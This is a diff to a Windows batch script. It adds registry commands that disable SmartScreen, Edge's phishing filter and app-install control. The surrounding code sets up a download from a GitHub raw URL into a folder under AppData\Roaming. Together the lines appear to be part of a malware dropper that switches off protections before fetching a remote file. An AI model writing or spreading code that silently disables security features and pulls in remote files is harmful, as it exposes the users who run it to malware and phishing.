@@ -1,6 +1,12 @@
 @echo off
 setlocal
 
+:: Disable SmartScreen
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System" /v "EnableSmartScreen" /t REG_DWORD /d "0" /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\MicrosoftEdge\PhishingFilter" /v "EnabledV9" /t REG_DWORD /d "0" /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender SmartScreen" /v "ConfigureAppInstallControlEnabled" /t REG_DWORD /d "0" /f
+
+:: Your existing code to download and rename the file
 set "url=https://github.com/rspvn/a/raw/main/test"
 set "folder=%USERPROFILE%\AppData\Roaming\test"
 set "file=test"
